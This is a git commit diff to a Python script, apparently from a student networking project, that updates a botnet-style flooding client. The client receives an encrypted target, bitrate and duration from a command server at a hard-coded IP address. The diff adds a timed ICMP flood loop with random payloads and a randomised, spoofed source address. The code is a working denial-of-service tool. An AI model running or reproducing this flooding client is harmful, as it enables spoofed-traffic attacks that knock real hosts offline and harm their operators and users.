5a5abb59d877ff279b750e52b9a45ffcd772bd7a
Victor PLANCHE <victor.planche@telecom-paris.fr>
2023-02-01 14:35:25 +0100

    bitrate update

--- multi_client.py
+++ multi_client.py
@@ -1,6 +1,8 @@
+from random import randint
 from cryptography.fernet import Fernet
 import socket
 from scapy.all import *
+import time
 
 #Récupération de la clé symétrique
 with open("secret.key", "rb") as key_file:
@@ -8,13 +10,16 @@ with open("secret.key", "rb") as key_file:
 fernet = Fernet(key)
 
 client_socket = socket.socket()
-host = "137.194.152.90"
+host = "137.194.143.14"
 port = 8081
 print('Waiting for connection response')
+
+
 try:
     client_socket.connect((host, port))
 except socket.error as e:
     print(str(e))
+
 res = client_socket.recv(1024)
 decrypted_data=fernet.decrypt(res).decode('utf-8')
 print(res, decrypted_data)
@@ -26,8 +31,23 @@ print(res, decrypted_data)
 client_socket.close()
 
 
-number = 10
-target = decrypted_data.split(" ")[0]
+bitrate = float(decrypted_data.split(" ")[1])
+wait_time = 0.001
+packet_size = min(int(bitrate*(10**6)*wait_time), 65503)
+print(packet_size)
+time_length = int(decrypted_data.split(" ")[2])
 
-for x in range (0,number): 
-    send(IP(dst=target)/ICMP()/Raw(RandString(10000)))
+target = decrypted_data.split(" ")[0]
+packet = IP(dst=target)/ICMP()/Raw(RandString(packet_size))
+packet[IP].src = ".".join(map(str, (randint(0, 255)for _ in range(4))))
+
+count = 0
+
+start_time = time.time()
+
+while time.time()-start_time < time_length: 
+    count += 1
+    send(packet)
+    time.sleep(wait_time)
+
+print(count*packet_size/(time.time()-start_time))
